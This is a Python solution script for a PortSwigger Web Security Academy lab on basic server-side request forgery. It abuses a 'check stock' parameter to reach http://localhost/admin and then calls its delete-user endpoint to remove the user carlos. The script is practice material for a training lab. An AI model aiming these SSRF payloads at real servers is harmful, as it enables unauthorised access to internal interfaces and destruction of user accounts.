"""
Lab 1: Basic SSRF against the local server
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
Difficulty: Apprentice

📝 The "check stock" feature's storeId is actually a URL the server fetches
server-side. Point it at localhost to reach an internal-only admin panel.

Goal: use the SSRF to delete user carlos via the internal admin interface.
"""

from utils import get_session, log, note, stock_check

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()

    note("Step 1: confirm the admin panel exists internally.")
    r = stock_check(s, TARGET, "1", "http://localhost/admin")
    log(f"Status: {r.status_code}")
    print(r.text[:500])

    note("Step 2: use the SSRF to hit the delete-user action directly.")
    r = stock_check(s, TARGET, "1", "http://localhost/admin/delete?username=carlos")
    log(f"Delete status: {r.status_code}")
    print(r.text[:500])


if __name__ == "__main__":
    run()
